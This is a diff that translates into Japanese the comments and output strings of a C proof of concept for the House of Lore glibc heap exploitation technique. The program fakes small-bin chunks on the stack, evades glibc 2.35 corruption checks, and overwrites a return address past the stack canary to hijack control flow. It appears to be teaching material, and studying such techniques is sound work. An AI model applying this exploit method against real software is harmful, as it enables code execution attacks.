@@ -1,6 +1,6 @@
 /*
-Advanced exploitation of the House of Lore - Malloc Maleficarum.
-This PoC take care also of the glibc hardening of smallbin corruption.
+House of Lore の高度な悪用 - Malloc Maleficarum。
+この PoC は、small bin の破壊に対する glibc の強化策にも対処しています。
 
 [ ... ]
 
@@ -27,7 +27,7 @@ else
 #include <stdint.h>
 #include <assert.h>
 
-void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }
+void jackpot(){ fprintf(stderr, "ナイスジャンプ!\n"); exit(0); }
 
 int main(int argc, char * argv[]){
 
@@ -36,102 +36,101 @@ int main(int argc, char * argv[]){
   intptr_t* stack_buffer_2[4] = {0};
   void* fake_freelist[7][4];
 
-  fprintf(stderr, "\nWelcome to the House of Lore\n");
-  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
-  fprintf(stderr, "This is tested against Ubuntu 22.04 - 64bit - glibc-2.35\n\n");
+  fprintf(stderr, "\nHouse of Lore へようこそ\n");
+  fprintf(stderr, "これは、glibc malloc に導入された強化チェックも回避する、再訪版です\n");
+  fprintf(stderr, "Ubuntu 22.04 - 64bit - glibc-2.35 でテストしています\n\n");
 
-  fprintf(stderr, "Allocating the victim chunk\n");
+  fprintf(stderr, "victim チャンクを確保します\n");
   intptr_t *victim = malloc(0x100);
-  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);
+  fprintf(stderr, "ヒープ上の %p に、最初の small チャンクを確保しました\n", victim);
 
-  fprintf(stderr, "Allocating dummy chunks for using up tcache later\n");
+  fprintf(stderr, "後で tcache を使い切るために、ダミーのチャンクを確保します\n");
   void *dummies[7];
   for(int i=0; i<7; i++) dummies[i] = malloc(0x100);
 
-  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
+  // チャンクの絶対アドレスを得るにはヘッダのサイズを取り除く必要があるため、victim-WORD_SIZE とします
   intptr_t *victim_chunk = victim-2;
 
-  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);
-  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);
+  fprintf(stderr, "stack_buffer_1 は %p にあります\n", (void*)stack_buffer_1);
+  fprintf(stderr, "stack_buffer_2 は %p にあります\n", (void*)stack_buffer_2);
 
-  fprintf(stderr, "Create a fake free-list on the stack\n");
+  fprintf(stderr, "スタック上に偽のfree list を作ります\n");
   for(int i=0; i<6; i++) {
     fake_freelist[i][3] = fake_freelist[i+1];
   }
   fake_freelist[6][3] = NULL;
-  fprintf(stderr, "fake free-list at %p\n", fake_freelist);
+  fprintf(stderr, "偽のfree listは %p にあります\n", fake_freelist);
 
-  fprintf(stderr, "Create a fake chunk on the stack\n");
-  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
-         "in second to the last malloc, which putting stack address on smallbin list\n");
+  fprintf(stderr, "スタック上に偽チャンクを作ります\n");
+  fprintf(stderr, "small bin 破壊のチェックを回避するために、fwd ポインタを victim_chunk に設定します。"
+         "これは最後から 2 番目の malloc で、スタックのアドレスを small bin のリストに載せるときのチェックです\n");
   stack_buffer_1[0] = 0;
   stack_buffer_1[1] = 0;
   stack_buffer_1[2] = victim_chunk;
 
-  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
-         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
-         "chunk on stack");
+  fprintf(stderr, "bk ポインタを stack_buffer_2 に設定し、stack_buffer_2 の fwd ポインタが stack_buffer_1 を指すように設定します。"
+         "これは、スタック上の偽チャンクへのポインタを返す最後の malloc での、small bin 破壊のチェックを回避するためです");
   stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
   stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
 
-  fprintf(stderr, "Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash "
-          "introduced by smallbin-to-tcache mechanism\n");
+  fprintf(stderr, "small bin から tcache への移動の仕組みによって生じるクラッシュを防ぐために、"
+          "stack_buffer_2 の bck ポインタを偽のfree listに設定します\n");
   stack_buffer_2[3] = (intptr_t *)fake_freelist[0];
   
-  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
-         "the small one during the free()\n");
+  fprintf(stderr, "free() の際に top chunkが small チャンクと併合されるのを避けるために、"
+         "別の large チャンクを確保します\n");
   void *p5 = malloc(1000);
-  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);
+  fprintf(stderr, "ヒープ上の %p に large チャンクを確保しました\n", p5);
 
 
-  fprintf(stderr, "Freeing dummy chunk\n");
+  fprintf(stderr, "ダミーのチャンクを解放します\n");
   for(int i=0; i<7; i++) free(dummies[i]);
-  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
+  fprintf(stderr, "チャンク %p を解放します。unsorted bin に挿入されます\n", victim);
   free((void*)victim);
 
-  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are the unsorted bin's header address (libc addresses)\n");
+  fprintf(stderr, "\nunsorted bin 内では、victim の fwd と bk のポインタは unsorted bin のヘッダのアドレス (libc のアドレス) です\n");
   fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
   fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
 
-  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
-  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);
+  fprintf(stderr, "ここで、UnsortedBin でも small bin でも処理できない malloc を行います\n");
+  fprintf(stderr, "つまり、チャンク %p は SmallBin の先頭に挿入されます\n", victim);
 
   void *p2 = malloc(1200);
-  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);
+  fprintf(stderr, "unsorted bin でも SmallBin でも処理できなかったチャンクが %p に確保されました\n", p2);
 
-  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
+  fprintf(stderr, "victim チャンクは整理 (sort) され、fwd と bk のポインタが更新されました\n");
   fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
   fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
 
-  //------------VULNERABILITY-----------
+  //------------脆弱性-----------
 
-  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
+  fprintf(stderr, "ここで、victim->bk ポインタを上書きできる脆弱性を模擬します\n");
 
-  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack
+  victim[1] = (intptr_t)stack_buffer_1; // victim->bk がスタックを指します
 
   //------------------------------------
-  fprintf(stderr, "Now take all dummies chunk in tcache out\n");
+  fprintf(stderr, "tcache 内のダミーのチャンクをすべて取り出します\n");
   for(int i=0; i<7; i++) malloc(0x100);
 
 
-  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
-  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");
+  fprintf(stderr, "ここで、最初に解放したチャンクと同じサイズのチャンクを確保します\n");
+  fprintf(stderr, "これは、上書きされた victim チャンクを返し、bin->bk を注入した victim->bk ポインタに設定するはずです\n");
 
   void *p3 = malloc(0x100);
 
-  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
+  fprintf(stderr, "この最後の malloc で、glibc の malloc をだまして、bin->bk に注入した位置のチャンクを返させます\n");
   char *p4 = malloc(0x100);
   fprintf(stderr, "p4 = malloc(0x100)\n");
 
-  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
+  fprintf(stderr, "\n最後の malloc のあと、stack_buffer_2 の fwd ポインタは %p に変わりました\n",
          stack_buffer_2[2]);
 
-  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
-  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
+  fprintf(stderr, "\np4 は %p で、スタック上にあるはずです!\n", p4); // このチャンクはスタック上に確保されます
+  intptr_t sc = (intptr_t)jackpot; // メモリ上のシェルコードを模擬します
 
   long offset = (long)__builtin_frame_address(0) - (long)p4;
-  memcpy((p4+offset+8), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
+  memcpy((p4+offset+8), &sc, 8); // カナリアを飛び越えるので、スタック破壊の検出を回避できます
 
-  // sanity check
+  // 確認用のチェック
   assert((long)__builtin_return_address(0) == (long)jackpot);
 }
